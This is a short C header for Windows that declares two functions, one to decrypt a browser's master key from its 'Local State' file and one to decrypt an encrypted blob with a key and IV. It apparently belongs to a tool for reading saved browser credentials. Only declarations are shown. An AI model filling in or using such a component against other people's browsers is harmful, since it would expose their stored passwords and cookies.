#include <windows.h>
#include <stdio.h>

#ifndef CRYPTO_H
#define CRYPTO_H

DATA_BLOB DecryptBrowserKey(const char *localstatePath);
void DecryptBlob(unsigned char* ciphertext, size_t ciphertext_length, unsigned char* key, unsigned char* iv, unsigned char* decrypted);

#endif